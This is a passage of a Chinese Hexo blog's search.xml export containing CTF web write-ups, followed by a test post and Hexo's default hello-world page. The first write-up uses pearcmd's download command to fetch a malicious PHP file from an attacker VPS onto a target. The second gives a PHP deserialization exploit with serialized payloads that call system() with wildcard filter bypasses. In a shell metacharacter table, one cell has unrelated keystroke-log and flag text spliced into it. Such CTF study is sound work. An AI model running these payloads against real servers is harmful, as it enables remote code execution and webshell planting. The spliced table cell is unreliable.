failed<br></code></pre></td></tr></table></figure><p>虽然提示下载失败，但是直接当前目录留下了php文件</p><p><img src="https://w4rsp1t3.moe/images/pearcmd_p7.jpg" alt="img"></p><p>我们可以尝试一下利用这个<code>download</code></p><p>我构造的payload为</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:3354/?+download+http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>当然我提前在服务器上构造好了目录:<code>test1.php&amp;file=/usr/local/lib/php/</code>，将恶意php命名为<code>pearcmd.php</code></p><p>其实可以去掉前面的test1.php，只要在服务器上创建相应的目录就行</p><p>然后直接访问<code>pearcmd.php</code>，成功</p><p>参考</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><p><a href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过Linux通配符+单个字符(香山杯php反序列化)</title>
    <link href="/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/"/>
    <url>/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>题目源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>那么是php反序列化，判断一下顺序</p><p><img src="/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/1697366971600.jpg" alt="1697366971600"></p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><span class="hljs-variable">$welcome</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$g00d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><span class="hljs-variable">$h4ck3r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$welcome</span>-&gt;name=<span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br><span class="hljs-variable">$welcome</span>-&gt;arg=<span class="hljs-variable">$h4ck3r</span>;<br><span class="hljs-variable">$g00d</span>-&gt;shell=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$g00d</span>-&gt;cmd=<span class="hljs-string">&#x27;sort /[e-h]1[!bcdehijkmnopqrstuvwxyz][e-h]&#x27;</span>;<br><span class="hljs-variable">$h4ck3r</span>-&gt;func=<span class="hljs-variable">$g00d</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$welcome</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是绕过单个的flag、<code>*</code>和<code>?</code>是一个问题，后来看到了这篇文章</p><p><a href="https://www.secpulse.com/archives/96374.html">https://www.secpulse.com/archives/96374.html</a></p><p>使用通配符绕过</p><table><thead><tr><th>字符</th><th>解释</th></tr></thead><tbody><tr><td>*</td><td>匹配任意长度任意字符</td></tr><tr><td>?</td><td>匹配任意单个字符</td></tr><tr><td>[list]</td><td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td>[^list]</td><td>匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td>[!list]</td><td>同[^list]</td></tr><tr><td>{str1,str2,…}</td><td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td></tr></tbody></table><p><strong>专用字符集</strong></p><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>任意数字或者字母</td></tr><tr><td>[:alpha:]</td><td>任意字母</td></tr><tr><td>[:space:]</td><td>空格</td></tr><tr><td>[:lower:]</td><td>小写字母</td></tr><tr><td>[:digit:]</td><td>任意数字</td></tr><tr><td>[:upper:]</td><td>任意大写字母</td></tr><tr><td>[:cntrl:]</td><td>控制符</td></tr><tr><td>[:graph:]</td><td>图形</td></tr><tr><td>[:print:]</td><td>可打印字符</td></tr><tr><td>[:punct:]</td><td>标点符号</td></tr><tr><td>[:xdigit:]</td><td>十六进制数</td></tr><tr><td>[:blank:]</td><td>空白字符（未验证）</td></tr></tbody></table><p><strong>Linux shell 元字符</strong>，在使用通配符时如果没有进行转义可能就会被辨识为元字符</p><table><thead><tr><th>字符</th><th>作用</th></tr></thead><tbody><tr><td>IFS</td><td>w3lc0m3<SPACE>to<SPACE>newstar<SPACE>ctf<SPACE>2023<SPACE>flag<SPACE>is<SPACE>here<SPACE>vbafjwrisgjadwwiihdgja13882hxbbbna     <CAP><CAP>ff<DEL>lll<DEL><DEL>aaa<DEL><DEL>gggg<DEL><DEL><DEL>{999<DEL><DEL>999<DEL><DEL>11<DEL>9aaa<DEL><DEL><SPACE><SPACE><DEL><DEL>eb2—<DEL><DEL>a450—<DEL><DEL>2f5f<SPACE><SPACE><SPACE><DEL><DEL><DEL>–<DEL>7bfc[unknown][unknown][unknown]-8989<DEL><DEL>dfdf<DEL><DEL>4bfa4bfa<DEL><DEL><DEL><DEL>85848584}}}<DEL><DEL><DEL><DEL><DEL><DEL><DEL>}]<SPACE><SPACE><SPACE><SPACE>nice<SPACE>work!1you<SPACE>got<SPACE>this<SPACE>flagoutput :w3lc0m3<SPACE>to<SPACE>newstar<SPACE>ctf<SPACE>2023<SPACE>flag<SPACE>is<SPACE>here<SPACE>vbafjwrisgjadwwiihdgja13882hxbbbna     <CAP>FLAG{9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584}]<SPACE><SPACE><SPACE><SPACE>NICE<SPACE>WORK!1YOU<SPACE>GOT<SPACE>THIS<SPACE>FLAGflag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}plaintd></tr><tr><td>CR</td><td>由 &lt; enter &gt; 产生</td></tr><tr><td>&#x3D;</td><td>设定变量</td></tr><tr><td>$</td><td>作变量或运算替换</td></tr><tr><td>&gt;</td><td>重导向标准输出</td></tr><tr><td>&lt;</td><td>重导向标准输入</td></tr><tr><td>|</td><td>命令管线</td></tr><tr><td>&amp;</td><td>重导向文件描述符，或将命令静默执行</td></tr><tr><td>( )</td><td>将其内的命令置于 nested subshell 执行，或用于运算或命令替换</td></tr><tr><td>{ }</td><td>将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围</td></tr><tr><td>;</td><td>在前一个命令结束时，而忽略其返回值，继续执行下一个命令</td></tr><tr><td>&amp;&amp;</td><td>在前一个命令结束时，若返回值为 true，继续执行下一个命令</td></tr><tr><td>||</td><td>在前一个命令结束时，若返回值为 false，继续执行下一个命令</td></tr><tr><td>!</td><td>执行 history 中的命令</td></tr></tbody></table><p>payload：<code>?data=O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:13:&quot;A_G00d_H4ck3r&quot;;s:3:&quot;arg&quot;;O:6:&quot;H4ck3r&quot;:1:&#123;s:4:&quot;func&quot;;O:4:&quot;G00d&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:13:&quot;/bin/[k-m]s /&quot;;&#125;&#125;&#125;</code>（注意<code>ls</code>实际是在<code>/bin/ls</code>目录下的）</p><p>回显bin boot dev etc f1ag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p><code>?data=O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:13:&quot;A_G00d_H4ck3r&quot;;s:3:&quot;arg&quot;;O:6:&quot;H4ck3r&quot;:1:&#123;s:4:&quot;func&quot;;O:4:&quot;G00d&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:51:&quot;/usr/bin/sort /[e-h]1[!bcdehijkmnopqrstuvwxyz][e-h]&quot;;&#125;&#125;&#125;</code></p><p><code>flag&#123;6a889acc-e31b-4a1f-b966-28d4fc963192&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png" alt="test"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/11/hello-world/"/>
    <url>/2023/10/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
